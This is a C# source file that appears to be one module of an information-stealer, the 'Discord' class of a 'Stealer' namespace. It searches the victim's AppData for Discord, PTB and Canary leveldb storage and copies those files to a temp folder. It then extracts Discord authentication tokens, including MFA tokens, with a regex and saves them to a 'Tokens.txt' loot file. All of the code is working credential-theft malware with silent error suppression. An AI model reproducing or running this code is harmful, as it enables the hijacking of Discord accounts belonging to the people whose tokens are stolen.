using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Discord
{
	public static Regex TokenRegex = new Regex("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}|mfa\\.[a-zA-Z0-9_\\-]{84}");

	public static string[] DiscordDirectories = new string[3] { "discord\\Local Storage\\leveldb", "discord PTB\\Local Storage\\leveldb", "discord Canary\\leveldb" };

	public static List<string> tokens = new List<string>();

	public static string[] Token(string ldb)
	{
		List<string> list = new List<string>();
		try
		{
			foreach (Match item in TokenRegex.Matches(File.ReadAllText(ldb)))
			{
				string value = item.Value;
				if (!string.IsNullOrWhiteSpace(value))
				{
					Counter.DiscordTokens++;
					list.Add(value);
				}
			}
		}
		catch
		{
		}
		return list.ToArray();
	}

	public static void Start(string LocalStorage)
	{
		try
		{
			string text = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
			Filemanager.CopyDirectory(LocalStorage, text);
			string[] files = Directory.GetFiles(text);
			foreach (string text2 in files)
			{
				if (text2.EndsWith(".log") || text2.EndsWith(".ldb"))
				{
					tokens.AddRange(Token(text2));
				}
			}
			Filemanager.RecursiveDelete(text);
		}
		catch
		{
		}
	}

	public static void Start()
	{
		try
		{
			string[] discordDirectories = DiscordDirectories;
			foreach (string path in discordDirectories)
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path);
				if (Directory.Exists(text))
				{
					Counter.Discord = true;
					Start(text);
				}
			}
		}
		catch
		{
		}
	}

	public static void WriteTokensInDynamic()
	{
		string[] array = tokens.ToArray();
		if (array.Length != 0)
		{
			DynamicFiles.WriteAllText(Path.Combine("Messengers", "Discord", "Tokens.txt"), string.Join("\n", (IEnumerable<string?>)array));
		}
	}
}
